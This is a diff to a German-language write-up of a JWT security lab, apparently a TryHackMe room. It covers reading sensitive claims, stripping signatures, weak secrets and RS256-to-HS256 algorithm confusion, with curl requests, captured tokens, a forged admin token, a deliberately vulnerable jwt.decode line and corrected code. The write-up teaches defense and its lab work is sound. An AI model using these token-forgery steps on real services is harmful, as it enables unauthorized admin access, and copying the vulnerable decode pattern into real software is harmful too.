@@ -62,8 +62,7 @@ Sehen wir uns ein praktisches Beispiel an. Authentifizieren wir uns mit der folg
 
 `curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.10.82.44/api/v1.0/example1`
 
-Dadurch erhalten Sie ein JWT-Token. Entschlüsseln Sie nach der Wiederherstellung den Textkörper des JWT, um sensible Informationen aufzudecken. Sie können den Textkörper manuell entschlüsseln oder hierfür eine Website wie `JWT.io` verwenden. https://www.jwt.io/
-
+Dadurch erhalten Sie ein JWT-Token. Entschlüsseln Sie nach der Wiederherstellung den Textkörper des JWT, um sensible Informationen aufzudecken. Sie können den Textkörper manuell entschlüsseln oder hierfür eine Website wie `JWT.io` verwenden oder noch besser https://jwt.tplant.com.au/
 ### Was ist hier der Fehler
 In diesem Beispiel wurden sensible Informationen zum Anspruch hinzugefügt, wie unten dargestellt:
 
@@ -115,7 +114,7 @@ Nach der Authentifizierung des Normalen Users bekommen wir als Antwort den JWT w
 
 Versuchen wir jedoch, unseren Benutzer ohne die Signatur zu verifizieren, entfernen wir den dritten Teil des JWT (und lassen nur den Punkt stehen) und stellen wir die Anfrage erneut. Werden wir sehen, dass die Verifizierung weiterhin funktioniert! Das bedeutet, dass die Signatur nicht überprüft wird.
 
-Um den Token zu Modifizieren können wir uns den jetzt einmal via https://www.jwt.io/ decoden lassen und sehen das die Decoded Payload wie Folgt ist: 
+Um den Token zu Modifizieren können wir uns den jetzt einmal via https://jwt.tplant.com.au/ decoden lassen und sehen das die Decoded Payload wie Folgt ist: 
 
 ```
 {
@@ -259,5 +258,88 @@ curl -H 'Authorization: Bearer ["eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2Vybm
 
 Damit haben wir uns dann als Admin authorisiert und bekommen nun unsere THM Flag
 
+
+### Das Problem 
+Das Problem kann auftreten, wenn ein schwaches JWT-Geheimnis verwendet wird. Dies kann häufig vorkommen, wenn Entwickler in Eile sind oder Code aus Beispielen kopieren.
+
+### Der Fix 
+
+Es sollte ein sicherer geheimer Wert ausgewählt werden. Da dieser Wert in der Software und nicht von Menschen verwendet wird, sollte für den geheimen Wert eine lange, zufällige Zeichenfolge verwendet werden.
 ## Signature Algorithm Confusion
 
+Das letzte häufige Problem bei der Signaturvalidierung tritt auf, wenn ein Algorithmus-Verwirrungsangriff durchgeführt werden kann. Dies ähnelt dem None-Downgrade-Angriff, tritt jedoch speziell bei Verwirrung zwischen symmetrischen und asymmetrischen Signaturalgorithmen auf. Wenn beispielsweise ein asymmetrischer Signaturalgorithmus wie RS256 verwendet wird, kann es möglich sein, den Algorithmus auf HS256 herunterzustufen. In diesen Fällen würden einige Bibliotheken standardmäßig wieder den öffentlichen Schlüssel als Geheimnis für den symmetrischen Signaturalgorithmus verwenden. Da der öffentliche Schlüssel bekannt sein kann, können Sie eine gültige Signatur fälschen, indem Sie den HS256-Algorithmus in Kombination mit dem öffentlichen Schlüssel verwenden.
+
+
+### Praktisches Beispiel 
+
+Gegebenheit API via http://10.10.207.144/api/v1.0/example5
+User: user
+Passwort: passwort4
+
+
+Vorgehen 
+Zuerst holen wir uns den Token mit bekannten login daten ab
+
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password5" }' http://10.10.207.144/api/v1.0/example5
+
+Response: 
+{
+  "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",
+
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q"
+}
+
+```
+Jetzt haben wir sowohl den Token als auch den Public Key. Jetzt können wir einmal testen das der Token auch funktioniert via
+
+```
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q' http://10.10.207.144/api/v1.0/example5?username=user
+```
+
+Nachdem Funktionalität getestet ist können wir anfangen den Token zu Modifizieren via https://jwt.tplant.com.au/ hier passen wir an: 
+- "alg": "RS256" zu "alg": "HS256"
+- "admin": 0 zu "admin": 1
+
+Zudem geben wir als Secret den Public Key an und erhalten daraus den Token: 
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.7jJBvWpF9JT4DdeUWnl0o7imBV0wa0HTDPRMavGbPyU
+```
+
+Mit diesem melden wir uns nun am Server via: 
+
+```
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.7jJBvWpF9JT4DdeUWnl0o7imBV0wa0HTDPRMavGbPyU' http://10.10.207.144/api/v1.0/example5?username=admin
+```
+
+und schon haben wir Admin rechte und erhalten die Flag.
+
+### Programmier Fehler
+
+Der Fehler in diesem Beispiel ähnelt dem in Beispiel 3, ist jedoch etwas komplexer. Der None-Algorithmus ist zwar nicht zulässig, das Hauptproblem besteht jedoch darin, dass sowohl symmetrische als auch asymmetrische Signaturalgorithmen zulässig sind, wie im folgenden Beispiel gezeigt wird:
+
+```
+payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512", "RS256", "RS384", "RS512"])
+```
+
+Es ist darauf zu achten, dass Signaturalgorithmen niemals miteinander vermischt werden, da der geheime Parameter der Dekodierungsfunktion sowohl als geheimer als auch als öffentlicher Schlüssel interpretiert werden können.
+
+### Fix
+
+Obwohl beide Arten von Signaturalgorithmen zulässig sind, ist etwas mehr Logik erforderlich, um Verwechslungen zu vermeiden, wie das folgende Beispiel zeigt:
+
+```
+header = jwt.get_unverified_header(token) 
+algorithm = header['alg'] 
+payload = "" 
+
+if "RS" in algorithm: 
+	payload = jwt.decode(token, self.public_key, algorithms=["RS256", "RS384", "RS512"]) 
+
+elif "HS" in algorithm: 
+	payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"]) 
+
+username = payload['username'] 
+flag = self.db_lookup(username, "flag")
+```
